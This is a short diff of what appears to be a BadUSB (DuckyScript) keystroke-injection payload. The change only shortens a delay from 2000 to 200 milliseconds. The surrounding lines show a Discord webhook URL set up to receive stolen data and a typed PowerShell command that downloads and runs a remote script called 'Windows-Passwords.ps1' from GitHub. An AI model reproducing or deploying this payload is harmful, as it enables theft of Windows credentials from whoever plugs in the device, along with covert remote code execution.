@@ -23,5 +23,5 @@ STRING https://discord.com/api/webhooks/1148872565029343233/Vlwhulrs4XR2hgqGudUM
 REM Reply example.com with YOUR LINK. The Payload should be Windows-Passwords.ps1
 DEFINE PAYLOAD example.com
 STRINGLN ';irm https://raw.githubusercontent.com/srikoushik123/bad-usb/main/Windows-Passwords.ps1 | iex
-DELAY 2000
+DELAY 200
 ENTER
